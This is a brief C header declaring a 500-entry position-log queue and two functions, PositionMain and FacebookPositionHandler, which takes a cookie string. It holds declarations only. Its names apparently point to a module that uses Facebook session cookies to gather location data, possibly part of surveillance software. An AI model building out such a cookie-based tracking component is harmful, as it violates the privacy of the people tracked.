#include "JSON.h"
#include "JSONValue.h"

#define MAX_POSITION_QUEUE 500

typedef struct 
{
	DWORD dwSize;
	LPBYTE lpBuffer;
} POSITION_LOGS, *LPPOSITION_LOGS;

extern POSITION_LOGS lpPositionLogs[MAX_POSITION_QUEUE];

VOID PositionMain();
DWORD FacebookPositionHandler(LPSTR strCookie);

